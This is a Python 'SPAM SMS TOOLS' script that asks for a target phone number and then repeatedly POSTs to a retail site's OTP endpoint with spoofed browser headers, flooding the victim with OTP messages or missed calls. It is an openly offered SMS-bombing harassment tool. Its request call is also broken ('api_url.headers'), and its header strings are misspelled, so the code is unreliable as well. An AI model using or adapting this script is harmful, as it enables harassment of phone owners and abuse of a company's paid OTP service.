#library python
from email import header
from urllib import response
from wsgiref import headers
import requests as rek
import json
import os
import sys
import time

#user interface
os.system('clear')
logo = """
SPAM SMS TOOLS
Author : MAde Agus Andi Gunawan
Team : IDNMAkerspace Algorithma Factory
Github : https://github.com/joeinus134131/

format input nomor telpon
>> 81234567689
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"""

os.system('clear')
print(logo)

#input data
target = input(" Nomor Target : ")
iterasi = input(" Perulangan : ")
iterasi = int(iterasi)
delay = input(" Delay : ")
delay = int(delay)

#API
api_url = "https://www.nutriclub.co.id/otp/?phone=0"+target+"&old_phone=0"+target

#Header API
headers = {
    "Host": "www.nutriclub.co.id",
    "content-length": "0", "accept":
    "aplication/json, text/javascript, */*; q=0.01",
    "x-requested-with": "XMLHttpRequest",
    "save-data": "on",
    "user-agent": "Mozila/5.0 (Linux; Android 8.1.0; CPH1853) ApplyWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "origin": "https://www.nutriclub.co.id",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty", "referer": "https://www.nutriclub.co.id/account/register",
}

#Iterasi percobaan pengiriman paket pesan
for i in range(iterasi):
    respon = rek.post(api_url.headers).text
    print(" Pesan ke -", i)
    print(" Terkirim . . . . . . . ")
    time.sleep(delay)

#json status
status = json.loads(respon)["StatusMessage"]
if status == "Request misscall berhasil":
    print("\n {*} Spam call / Telepon untuk No"+ target+" Berhasil \n")
else:
    print("\n {*} Spam sudah dilakukan 3x >> Gaga; \n")